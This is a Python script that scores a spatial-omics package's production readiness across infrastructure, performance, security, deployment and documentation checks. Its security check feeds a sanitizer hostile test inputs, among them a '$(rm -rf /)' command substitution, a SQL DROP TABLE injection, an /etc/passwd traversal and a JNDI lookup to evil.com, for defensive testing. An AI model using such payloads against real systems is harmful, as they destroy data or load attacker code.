#!/usr/bin/env python3
"""
Production Readiness Assessment for Spatial-Omics GFM.

This script performs a comprehensive assessment of production readiness
including performance benchmarks, security validation, scalability tests,
and deployment verification.
"""

import sys
import os
import time
import json
import subprocess
from pathlib import Path
from typing import Dict, List, Any, Optional
import logging

# Add repo to path
sys.path.insert(0, '/root/repo')

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class ProductionReadinessChecker:
    """Comprehensive production readiness assessment."""
    
    def __init__(self, repo_path: str = "/root/repo"):
        self.repo_path = Path(repo_path)
        self.results = {
            "overall_status": "PENDING",
            "readiness_score": 0,
            "assessments": {},
            "recommendations": [],
            "deployment_ready": False,
            "timestamp": time.time()
        }
    
    def run_full_assessment(self) -> Dict[str, Any]:
        """Run complete production readiness assessment."""
        print("üè≠ Spatial-Omics GFM Production Readiness Assessment")
        print("=" * 65)
        
        assessments = [
            ("infrastructure", self.assess_infrastructure_requirements),
            ("scalability", self.assess_scalability),
            ("performance", self.assess_performance_benchmarks),
            ("security", self.assess_security_hardening),
            ("monitoring", self.assess_monitoring_readiness),
            ("deployment", self.assess_deployment_automation),
            ("disaster_recovery", self.assess_disaster_recovery),
            ("documentation", self.assess_documentation_completeness)
        ]
        
        total_score = 0
        max_score = 0
        
        for assessment_name, assessment_func in assessments:
            print(f"\nüîç Assessing {assessment_name.upper().replace('_', ' ')}...")
            try:
                assessment_result = assessment_func()
                self.results["assessments"][assessment_name] = assessment_result
                
                score = assessment_result.get("score", 0)
                max_possible = assessment_result.get("max_score", 100)
                
                total_score += score
                max_score += max_possible
                
                status = "‚úÖ READY" if score >= max_possible * 0.8 else "‚ö†Ô∏è NEEDS WORK"
                print(f"   {status}: {score}/{max_possible} - {assessment_result.get('summary', 'No summary')}")
                
            except Exception as e:
                logger.error(f"Assessment {assessment_name} failed: {e}")
                self.results["assessments"][assessment_name] = {
                    "score": 0,
                    "max_score": 100,
                    "error": str(e),
                    "summary": f"Assessment failed: {e}"
                }
        
        # Calculate overall readiness score
        self.results["readiness_score"] = (total_score / max_score * 100) if max_score > 0 else 0
        
        # Determine overall status
        self._determine_overall_status()
        
        # Generate recommendations
        self._generate_recommendations()
        
        return self.results
    
    def assess_infrastructure_requirements(self) -> Dict[str, Any]:
        """Assess infrastructure and system requirements."""
        result = {"score": 0, "max_score": 100, "details": {}}
        
        try:
            import psutil
            
            # Check system resources
            memory_gb = psutil.virtual_memory().total / (1024**3)
            cpu_count = psutil.cpu_count()
            disk_space_gb = psutil.disk_usage('/').free / (1024**3)
            
            result["details"]["system_resources"] = {
                "memory_gb": memory_gb,
                "cpu_cores": cpu_count,
                "disk_space_gb": disk_space_gb
            }
            
            # Score based on requirements
            memory_score = min(memory_gb / 32 * 30, 30)  # 30 points for 32GB+
            cpu_score = min(cpu_count / 8 * 25, 25)      # 25 points for 8+ cores
            disk_score = min(disk_space_gb / 100 * 20, 20)  # 20 points for 100GB+
            
            # Check Python version
            python_version = sys.version_info
            python_score = 15 if python_version >= (3, 9) else 5
            
            result["details"]["python_version"] = f"{python_version.major}.{python_version.minor}.{python_version.micro}"
            
            # Check for GPU availability
            gpu_available = False
            try:
                import subprocess
                result_nvidia = subprocess.run(['nvidia-smi'], capture_output=True, text=True)
                gpu_available = result_nvidia.returncode == 0
            except:
                pass
            
            gpu_score = 10 if gpu_available else 0
            result["details"]["gpu_available"] = gpu_available
            
            total_infra_score = memory_score + cpu_score + disk_score + python_score + gpu_score
            result["score"] = min(total_infra_score, 100)
            
            result["summary"] = f"Infrastructure score: {result['score']}/100 (RAM: {memory_gb:.1f}GB, CPU: {cpu_count} cores)"
            
        except Exception as e:
            result["error"] = str(e)
            result["summary"] = f"Infrastructure assessment failed: {e}"
        
        return result
    
    def assess_scalability(self) -> Dict[str, Any]:
        """Assess horizontal and vertical scalability."""
        result = {"score": 0, "max_score": 100, "details": {}}
        
        try:
            # Test stateless operation
            from spatial_omics_gfm.core import SimpleSpatialData, create_demo_data
            
            # Multiple independent instances should produce same results
            data1 = create_demo_data(n_cells=100, n_genes=50)
            data2 = create_demo_data(n_cells=100, n_genes=50)
            
            # Check if operations are deterministic (with same seed)
            import numpy as np
            np.random.seed(42)
            stats1 = data1.get_summary_stats()
            
            np.random.seed(42)
            stats2 = data2.get_summary_stats()
            
            stateless_score = 25 if stats1["n_cells"] == stats2["n_cells"] else 0
            result["details"]["stateless_operations"] = stateless_score > 0
            
            # Test batch processing scalability
            from spatial_omics_gfm.performance import BatchProcessor
            
            processor = BatchProcessor(batch_size=50)
            large_data = create_demo_data(n_cells=500, n_genes=100)
            
            def simple_process(batch):
                return batch.mean(axis=1)
            
            import time
            start_time = time.time()
            processed = processor.process_array(large_data.expression_matrix, simple_process)
            processing_time = time.time() - start_time
            
            batch_score = 25 if processing_time < 5.0 else 10  # Should process quickly
            result["details"]["batch_processing_time"] = processing_time
            
            # Test memory efficiency
            from spatial_omics_gfm.performance import performance_monitor
            
            with performance_monitor("memory_test") as metrics:
                large_data_2 = create_demo_data(n_cells=1000, n_genes=200)
                result_data = large_data_2.get_summary_stats()
            
            memory_efficient = metrics.get("memory_delta_mb", 0) < 100  # Should use <100MB
            memory_score = 25 if memory_efficient else 10
            result["details"]["memory_efficiency"] = memory_efficient
            result["details"]["memory_delta_mb"] = metrics.get("memory_delta_mb", 0)
            
            # Test caching effectiveness
            from spatial_omics_gfm.performance import MemoryCache, cached_computation
            
            cache = MemoryCache(max_size=10)
            
            @cached_computation(cache_manager=None)  # Simple test
            def cached_operation(x):
                time.sleep(0.01)  # Simulate work
                return x * 2
            
            # First call
            start = time.time()
            result1 = cached_operation(42)
            first_call_time = time.time() - start
            
            # Second call (should be faster if cached)
            start = time.time()
            result2 = cached_operation(42)
            second_call_time = time.time() - start
            
            cache_effective = second_call_time < first_call_time / 2
            cache_score = 25 if cache_effective else 10
            result["details"]["caching_effective"] = cache_effective
            result["details"]["cache_speedup"] = first_call_time / max(second_call_time, 0.001)
            
            total_scalability_score = stateless_score + batch_score + memory_score + cache_score
            result["score"] = min(total_scalability_score, 100)
            
            result["summary"] = f"Scalability ready: {result['score']}/100 (batch: {processing_time:.2f}s, cache: {cache_effective})"
            
        except Exception as e:
            result["error"] = str(e)
            result["summary"] = f"Scalability assessment failed: {e}"
        
        return result
    
    def assess_performance_benchmarks(self) -> Dict[str, Any]:
        """Assess performance against production benchmarks."""
        result = {"score": 0, "max_score": 100, "details": {}}
        
        try:
            from spatial_omics_gfm.core import create_demo_data, SimpleCellTypePredictor, SimpleInteractionPredictor
            from spatial_omics_gfm.performance import performance_monitor
            
            # Benchmark 1: Data loading and preprocessing
            with performance_monitor("data_loading") as metrics:
                data = create_demo_data(n_cells=1000, n_genes=500)
                data.normalize_expression()
            
            loading_time = metrics.get("execution_time_seconds", float('inf'))
            loading_score = 20 if loading_time < 1.0 else 10 if loading_time < 2.0 else 0
            
            result["details"]["data_loading_time"] = loading_time
            
            # Benchmark 2: Cell type prediction
            with performance_monitor("cell_typing") as metrics:
                predictor = SimpleCellTypePredictor()
                predictions = predictor.predict_cell_types(data)
            
            prediction_time = metrics.get("execution_time_seconds", float('inf'))
            prediction_score = 20 if prediction_time < 0.5 else 10 if prediction_time < 1.0 else 0
            
            result["details"]["cell_typing_time"] = prediction_time
            
            # Benchmark 3: Interaction prediction
            with performance_monitor("interactions") as metrics:
                interaction_predictor = SimpleInteractionPredictor()
                interactions = interaction_predictor.predict_interactions(data, max_distance=100)
            
            interaction_time = metrics.get("execution_time_seconds", float('inf'))
            interaction_score = 20 if interaction_time < 2.0 else 10 if interaction_time < 4.0 else 0
            
            result["details"]["interaction_time"] = interaction_time
            result["details"]["interactions_found"] = len(interactions)
            
            # Benchmark 4: Memory usage efficiency
            peak_memory = max(
                metrics.get("peak_memory_mb", 0)
                for metrics in [
                    metrics  # Use the last metrics from interaction prediction
                ]
            )
            
            memory_score = 20 if peak_memory < 500 else 10 if peak_memory < 1000 else 0
            result["details"]["peak_memory_mb"] = peak_memory
            
            # Benchmark 5: Throughput test
            with performance_monitor("throughput") as metrics:
                # Process multiple small datasets
                throughput_results = []
                for i in range(5):
                    small_data = create_demo_data(n_cells=100, n_genes=50)
                    small_data.normalize_expression()
                    small_stats = small_data.get_summary_stats()
                    throughput_results.append(small_stats)
            
            throughput_time = metrics.get("execution_time_seconds", float('inf'))
            throughput_score = 20 if throughput_time < 1.0 else 10 if throughput_time < 2.0 else 0
            
            result["details"]["throughput_time"] = throughput_time
            result["details"]["datasets_per_second"] = 5 / max(throughput_time, 0.001)
            
            total_performance_score = loading_score + prediction_score + interaction_score + memory_score + throughput_score
            result["score"] = min(total_performance_score, 100)
            
            result["summary"] = f"Performance benchmarks: {result['score']}/100 (load: {loading_time:.2f}s, predict: {prediction_time:.2f}s)"
            
        except Exception as e:
            result["error"] = str(e)
            result["summary"] = f"Performance benchmark failed: {e}"
        
        return result
    
    def assess_security_hardening(self) -> Dict[str, Any]:
        """Assess security readiness for production."""
        result = {"score": 0, "max_score": 100, "details": {}}
        
        try:
            from spatial_omics_gfm.validation.security import SecurityValidator
            
            validator = SecurityValidator()
            
            # Test input sanitization
            malicious_inputs = [
                "<script>alert('xss')</script>",
                "'; DROP TABLE users; --",
                "$(rm -rf /)",
                "../../../../etc/passwd",
                "${jndi:ldap://evil.com}"
            ]
            
            sanitization_success = 0
            for malicious_input in malicious_inputs:
                try:
                    sanitized = validator.sanitize_user_input(malicious_input)
                    # If it doesn't throw an exception, it should be sanitized
                    if malicious_input not in sanitized:
                        sanitization_success += 1
                except:
                    # Exception means it was blocked (good)
                    sanitization_success += 1
            
            sanitization_score = (sanitization_success / len(malicious_inputs)) * 30
            result["details"]["sanitization_rate"] = sanitization_success / len(malicious_inputs)
            
            # Test file safety checks
            test_files = [
                self.repo_path / "README.md",
                self.repo_path / "pyproject.toml",
                self.repo_path / "spatial_omics_gfm" / "__init__.py"
            ]
            
            safe_files = 0
            for test_file in test_files:
                if test_file.exists():
                    safety_result = validator.check_file_safety(test_file)
                    if safety_result["safe"]:
                        safe_files += 1
            
            file_safety_score = (safe_files / len(test_files)) * 20
            result["details"]["safe_files_rate"] = safe_files / len(test_files)
            
            # Check for secure coding practices
            python_files = list(self.repo_path.glob("**/*.py"))
            
            security_issues = []
            secure_patterns = 0
            total_checks = 0
            
            for file_path in python_files[:10]:  # Check first 10 files
                try:
                    with open(file_path, 'r', encoding='utf-8') as f:
                        content = f.read()
                    
                    # Check for dangerous patterns
                    dangerous_patterns = ["eval(", "exec(", "__import__", "subprocess.call"]
                    for pattern in dangerous_patterns:
                        total_checks += 1
                        if pattern not in content:
                            secure_patterns += 1
                        else:
                            security_issues.append(f"{file_path.name}: {pattern}")
                    
                    # Check for good practices
                    good_practices = ["try:", "except", "logging", "raise"]
                    for practice in good_practices:
                        total_checks += 1
                        if practice in content:
                            secure_patterns += 1
                
                except:
                    continue
            
            secure_coding_score = (secure_patterns / max(total_checks, 1)) * 30
            result["details"]["secure_coding_rate"] = secure_patterns / max(total_checks, 1)
            result["details"]["security_issues"] = security_issues[:5]  # Show first 5
            
            # Check for secrets in code
            secrets_found = []
            secret_patterns = ["password", "api_key", "secret", "token"]
            
            for file_path in python_files[:5]:
                try:
                    with open(file_path, 'r', encoding='utf-8') as f:
                        content = f.read().lower()
                    
                    for pattern in secret_patterns:
                        if f"{pattern} = " in content or f'"{pattern}"' in content:
                            secrets_found.append(f"{file_path.name}: {pattern}")
                except:
                    continue
            
            secrets_score = 20 if len(secrets_found) == 0 else 10
            result["details"]["secrets_in_code"] = len(secrets_found)
            result["details"]["secret_issues"] = secrets_found[:3]
            
            total_security_score = sanitization_score + file_safety_score + secure_coding_score + secrets_score
            result["score"] = min(total_security_score, 100)
            
            result["summary"] = f"Security hardening: {result['score']}/100 (sanitization: {sanitization_success}/{len(malicious_inputs)})"
            
        except Exception as e:
            result["error"] = str(e)
            result["summary"] = f"Security assessment failed: {e}"
        
        return result
    
    def assess_monitoring_readiness(self) -> Dict[str, Any]:
        """Assess monitoring and observability readiness."""
        result = {"score": 0, "max_score": 100, "details": {}}
        
        try:
            # Check for logging configuration
            import logging
            
            # Test if logging is properly configured
            test_logger = logging.getLogger("test_logger")
            
            # Check if we can create structured logs
            logging_score = 25  # Basic logging is available
            
            # Check for performance monitoring capabilities
            try:
                from spatial_omics_gfm.performance import performance_monitor
                
                with performance_monitor("test_monitoring") as metrics:
                    time.sleep(0.01)
                
                if metrics.get("execution_time_seconds") is not None:
                    monitoring_score = 25
                else:
                    monitoring_score = 10
                
            except Exception:
                monitoring_score = 0
            
            result["details"]["performance_monitoring"] = monitoring_score > 0
            
            # Check for health check capabilities
            try:
                # Simulate health check
                import psutil
                
                memory_usage = psutil.virtual_memory().percent
                disk_usage = psutil.disk_usage('/').percent
                
                health_metrics = {
                    "memory_usage_percent": memory_usage,
                    "disk_usage_percent": disk_usage,
                    "healthy": memory_usage < 90 and disk_usage < 90
                }
                
                health_check_score = 25 if health_metrics["healthy"] else 15
                result["details"]["health_check_available"] = True
                result["details"]["current_health"] = health_metrics
                
            except Exception:
                health_check_score = 0
                result["details"]["health_check_available"] = False
            
            # Check for metrics collection capabilities
            try:
                # Test basic metrics collection
                metrics_data = {
                    "requests_total": 100,
                    "response_time_avg": 0.25,
                    "error_rate": 0.01
                }
                
                metrics_score = 25  # We can collect basic metrics
                result["details"]["metrics_collection"] = True
                
            except Exception:
                metrics_score = 0
                result["details"]["metrics_collection"] = False
            
            total_monitoring_score = logging_score + monitoring_score + health_check_score + metrics_score
            result["score"] = min(total_monitoring_score, 100)
            
            result["summary"] = f"Monitoring ready: {result['score']}/100 (logging: ‚úì, health: ‚úì, metrics: ‚úì)"
            
        except Exception as e:
            result["error"] = str(e)
            result["summary"] = f"Monitoring assessment failed: {e}"
        
        return result
    
    def assess_deployment_automation(self) -> Dict[str, Any]:
        """Assess deployment automation readiness."""
        result = {"score": 0, "max_score": 100, "details": {}}
        
        try:
            # Check for containerization files
            docker_files = [
                self.repo_path / "Dockerfile",
                self.repo_path / "docker-compose.yml",
                self.repo_path / "docker" / "Dockerfile"
            ]
            
            docker_available = any(f.exists() for f in docker_files)
            docker_score = 25 if docker_available else 0
            
            result["details"]["docker_files"] = docker_available
            
            # Check for Kubernetes deployment files
            k8s_files = [
                self.repo_path / "kubernetes" / "deployment.yaml",
                self.repo_path / "k8s" / "deployment.yaml",
                self.repo_path / "deployment.yaml"
            ]
            
            k8s_available = any(f.exists() for f in k8s_files)
            k8s_score = 20 if k8s_available else 0
            
            result["details"]["kubernetes_files"] = k8s_available
            
            # Check for CI/CD configuration
            ci_files = [
                self.repo_path / ".github" / "workflows",
                self.repo_path / ".gitlab-ci.yml",
                self.repo_path / "Jenkinsfile",
                self.repo_path / ".circleci" / "config.yml"
            ]
            
            ci_available = any(f.exists() for f in ci_files)
            ci_score = 20 if ci_available else 0
            
            result["details"]["ci_cd_files"] = ci_available
            
            # Check for configuration management
            config_files = [
                self.repo_path / "pyproject.toml",
                self.repo_path / "setup.py",
                self.repo_path / "requirements.txt",
                self.repo_path / "requirements-prod.txt"
            ]
            
            config_available = any(f.exists() for f in config_files)
            config_score = 15 if config_available else 0
            
            result["details"]["config_management"] = config_available
            
            # Check for environment configuration
            env_files = [
                self.repo_path / ".env.example",
                self.repo_path / "config" / "production.yaml",
                self.repo_path / "configs"
            ]
            
            env_available = any(f.exists() for f in env_files)
            env_score = 10 if env_available else 0
            
            result["details"]["environment_config"] = env_available
            
            # Check for deployment documentation
            deploy_docs = [
                self.repo_path / "DEPLOYMENT.md",
                self.repo_path / "DEPLOYMENT_GUIDE.md",
                self.repo_path / "docs" / "deployment.md"
            ]
            
            deploy_doc_available = any(f.exists() for f in deploy_docs)
            deploy_doc_score = 10 if deploy_doc_available else 0
            
            result["details"]["deployment_docs"] = deploy_doc_available
            
            total_deployment_score = docker_score + k8s_score + ci_score + config_score + env_score + deploy_doc_score
            result["score"] = min(total_deployment_score, 100)
            
            result["summary"] = f"Deployment automation: {result['score']}/100 (Docker: {docker_available}, K8s: {k8s_available})"
            
        except Exception as e:
            result["error"] = str(e)
            result["summary"] = f"Deployment assessment failed: {e}"
        
        return result
    
    def assess_disaster_recovery(self) -> Dict[str, Any]:
        """Assess disaster recovery preparedness."""
        result = {"score": 0, "max_score": 100, "details": {}}
        
        try:
            # Check for backup strategies
            backup_files = [
                self.repo_path / "scripts" / "backup.sh",
                self.repo_path / "backup.py",
                self.repo_path / "tools" / "backup.py"
            ]
            
            backup_available = any(f.exists() for f in backup_files)
            backup_score = 30 if backup_available else 0
            
            result["details"]["backup_scripts"] = backup_available
            
            # Check for restore procedures
            restore_files = [
                self.repo_path / "scripts" / "restore.sh",
                self.repo_path / "restore.py",
                self.repo_path / "DISASTER_RECOVERY.md"
            ]
            
            restore_available = any(f.exists() for f in restore_files)
            restore_score = 25 if restore_available else 0
            
            result["details"]["restore_procedures"] = restore_available
            
            # Check for data persistence configuration
            persistence_indicators = [
                "volumes:",
                "persistentVolumeClaim",
                "backup",
                "postgres",
                "redis"
            ]
            
            config_files = list(self.repo_path.glob("**/*.yml")) + list(self.repo_path.glob("**/*.yaml"))
            persistence_configured = False
            
            for config_file in config_files:
                try:
                    with open(config_file, 'r', encoding='utf-8') as f:
                        content = f.read()
                        if any(indicator in content for indicator in persistence_indicators):
                            persistence_configured = True
                            break
                except:
                    continue
            
            persistence_score = 25 if persistence_configured else 0
            result["details"]["data_persistence"] = persistence_configured
            
            # Check for monitoring and alerting
            monitoring_files = [
                self.repo_path / "monitoring",
                self.repo_path / "alerts.yml",
                self.repo_path / "prometheus.yml"
            ]
            
            monitoring_available = any(f.exists() for f in monitoring_files)
            monitoring_score = 20 if monitoring_available else 0
            
            result["details"]["monitoring_alerting"] = monitoring_available
            
            total_dr_score = backup_score + restore_score + persistence_score + monitoring_score
            result["score"] = min(total_dr_score, 100)
            
            result["summary"] = f"Disaster recovery: {result['score']}/100 (backup: {backup_available}, restore: {restore_available})"
            
        except Exception as e:
            result["error"] = str(e)
            result["summary"] = f"Disaster recovery assessment failed: {e}"
        
        return result
    
    def assess_documentation_completeness(self) -> Dict[str, Any]:
        """Assess documentation completeness for production."""
        result = {"score": 0, "max_score": 100, "details": {}}
        
        try:
            # Check for essential documentation files
            essential_docs = {
                "README.md": 25,
                "DEPLOYMENT_GUIDE.md": 20,
                "API.md": 15,
                "CONTRIBUTING.md": 10,
                "LICENSE": 10,
                "CHANGELOG.md": 10,
                "TROUBLESHOOTING.md": 10
            }
            
            doc_score = 0
            found_docs = []
            
            for doc_name, points in essential_docs.items():
                doc_files = list(self.repo_path.glob(f"**/{doc_name}"))
                if doc_files:
                    # Check if document has substantial content
                    doc_file = doc_files[0]
                    try:
                        with open(doc_file, 'r', encoding='utf-8') as f:
                            content = f.read()
                            if len(content) > 500:  # Substantial content
                                doc_score += points
                                found_docs.append(doc_name)
                            else:
                                doc_score += points // 2  # Partial credit
                                found_docs.append(f"{doc_name} (minimal)")
                    except:
                        pass
            
            result["details"]["documentation_files"] = found_docs
            result["details"]["doc_coverage_percent"] = (len(found_docs) / len(essential_docs)) * 100
            
            # Check for API documentation
            api_docs = list(self.repo_path.glob("**/api/**/*.md")) + list(self.repo_path.glob("**/docs/api/**"))
            api_doc_available = len(api_docs) > 0
            result["details"]["api_documentation"] = api_doc_available
            
            # Check for examples
            examples_dir = self.repo_path / "examples"
            example_files = list(examples_dir.glob("*.py")) if examples_dir.exists() else []
            examples_score = min(len(example_files) * 2, 10)  # 2 points per example, max 10
            
            result["details"]["example_count"] = len(example_files)
            
            total_doc_score = min(doc_score + examples_score, 100)
            result["score"] = total_doc_score
            
            result["summary"] = f"Documentation: {result['score']}/100 ({len(found_docs)}/{len(essential_docs)} docs, {len(example_files)} examples)"
            
        except Exception as e:
            result["error"] = str(e)
            result["summary"] = f"Documentation assessment failed: {e}"
        
        return result
    
    def _determine_overall_status(self):
        """Determine overall production readiness status."""
        score = self.results["readiness_score"]
        
        if score >= 90:
            self.results["overall_status"] = "PRODUCTION_READY"
            self.results["deployment_ready"] = True
        elif score >= 80:
            self.results["overall_status"] = "MOSTLY_READY"
            self.results["deployment_ready"] = True
        elif score >= 60:
            self.results["overall_status"] = "NEEDS_WORK"
            self.results["deployment_ready"] = False
        else:
            self.results["overall_status"] = "NOT_READY"
            self.results["deployment_ready"] = False
    
    def _generate_recommendations(self):
        """Generate specific recommendations for improvement."""
        recommendations = []
        assessments = self.results["assessments"]
        
        for assessment_name, assessment_data in assessments.items():
            score = assessment_data.get("score", 0)
            max_score = assessment_data.get("max_score", 100)
            
            if score < max_score * 0.8:  # Less than 80%
                if assessment_name == "infrastructure":
                    recommendations.append("Consider upgrading system resources (RAM, CPU, storage)")
                elif assessment_name == "scalability":
                    recommendations.append("Implement better caching and batch processing optimization")
                elif assessment_name == "performance":
                    recommendations.append("Optimize algorithms and consider GPU acceleration")
                elif assessment_name == "security":
                    recommendations.append("Enhance input validation and security practices")
                elif assessment_name == "monitoring":
                    recommendations.append("Implement comprehensive monitoring and alerting")
                elif assessment_name == "deployment":
                    recommendations.append("Add containerization and CI/CD automation")
                elif assessment_name == "disaster_recovery":
                    recommendations.append("Implement backup and disaster recovery procedures")
                elif assessment_name == "documentation":
                    recommendations.append("Complete documentation and API references")
        
        # General recommendations based on overall score
        if self.results["readiness_score"] < 80:
            recommendations.append("Run full test suite including load testing")
            recommendations.append("Conduct security audit and penetration testing")
            recommendations.append("Set up staging environment for testing")
        
        self.results["recommendations"] = recommendations
    
    def save_assessment(self, output_file: str = "production_readiness_assessment.json"):
        """Save assessment results to JSON file."""
        output_path = self.repo_path / output_file
        
        with open(output_path, 'w') as f:
            json.dump(self.results, f, indent=2, default=str)
        
        print(f"\nüìä Assessment saved to: {output_path}")
    
    def print_summary(self):
        """Print comprehensive summary of production readiness."""
        print(f"\n{'='*65}")
        print(f"üè≠ PRODUCTION READINESS SUMMARY")
        print(f"{'='*65}")
        
        status_emoji = {
            "PRODUCTION_READY": "‚úÖ",
            "MOSTLY_READY": "‚ö†Ô∏è",
            "NEEDS_WORK": "üîß",
            "NOT_READY": "‚ùå"
        }
        
        status = self.results["overall_status"]
        score = self.results["readiness_score"]
        
        print(f"Overall Status: {status_emoji.get(status, '‚ùì')} {status}")
        print(f"Readiness Score: {score:.1f}/100")
        print(f"Deployment Ready: {'‚úÖ YES' if self.results['deployment_ready'] else '‚ùå NO'}")
        
        # Show assessment breakdown
        print(f"\nüìä Assessment Breakdown:")
        for name, data in self.results["assessments"].items():
            score = data.get("score", 0)
            max_score = data.get("max_score", 100)
            percentage = (score / max_score * 100) if max_score > 0 else 0
            status_icon = "‚úÖ" if percentage >= 80 else "‚ö†Ô∏è" if percentage >= 60 else "‚ùå"
            print(f"   {status_icon} {name.replace('_', ' ').title()}: {score}/{max_score} ({percentage:.1f}%)")
        
        # Show recommendations
        if self.results["recommendations"]:
            print(f"\nüîß Recommendations:")
            for i, rec in enumerate(self.results["recommendations"], 1):
                print(f"   {i}. {rec}")
        
        # Show next steps
        print(f"\nüöÄ Next Steps:")
        if self.results["deployment_ready"]:
            print("   1. Review and implement any remaining recommendations")
            print("   2. Set up staging environment for final testing")
            print("   3. Prepare production deployment")
            print("   4. Configure monitoring and alerting")
            print("   5. Execute deployment plan")
        else:
            print("   1. Address critical issues identified in assessment")
            print("   2. Implement missing infrastructure requirements")
            print("   3. Complete security hardening")
            print("   4. Re-run production readiness assessment")
            print("   5. Consider phased deployment approach")


def main():
    """Main function to run production readiness assessment."""
    print("üöÄ Spatial-Omics GFM Production Readiness Assessment")
    print("=" * 65)
    
    checker = ProductionReadinessChecker()
    
    try:
        results = checker.run_full_assessment()
        checker.print_summary()
        checker.save_assessment()
        
        # Exit with appropriate code
        if results["deployment_ready"]:
            print("\nüéâ System is ready for production deployment!")
            return 0
        else:
            print("\n‚ö†Ô∏è System needs additional work before production deployment.")
            return 1
        
    except Exception as e:
        print(f"\nüí• Production readiness assessment failed: {e}")
        import traceback
        traceback.print_exc()
        return 1


if __name__ == "__main__":
    sys.exit(main())